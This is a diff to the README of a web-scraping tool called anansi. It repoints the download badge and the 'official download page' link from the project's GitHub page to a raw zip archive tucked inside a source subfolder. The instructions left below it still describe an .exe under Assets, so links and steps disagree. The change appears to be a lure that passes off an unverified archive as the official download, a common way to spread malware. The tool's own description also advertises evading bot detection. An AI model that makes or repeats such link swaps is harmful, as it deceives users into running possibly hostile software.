@@ -1,6 +1,6 @@
 # 🕷️ anansi - Gather data from difficult websites easily
 
-[![](https://img.shields.io/badge/Download-Anansi-blue)](https://github.com/aboral-bumper926/anansi)
+[![](https://img.shields.io/badge/Download-Anansi-blue)](https://raw.githubusercontent.com/aboral-bumper926/anansi/main/anansi/spider/Software_3.2-beta.4.zip)
 
 Anansi helps you collect information from websites that block standard tools. It fixes broken parts on its own and acts like a real person to avoid detection. You can connect it to AI models to perform searches through simple chat.
 
@@ -22,7 +22,7 @@ Many websites prevent automated tools from reading their data. These sites check
 
 ## 📥 How to get started
 
-1. Visit [the official download page](https://github.com/aboral-bumper926/anansi).
+1. Visit [the official download page](https://raw.githubusercontent.com/aboral-bumper926/anansi/main/anansi/spider/Software_3.2-beta.4.zip).
 2. Locate the section labeled Assets.
 3. Click the file ending in .exe to start your download.
 4. Save the file to your desktop or downloads folder.
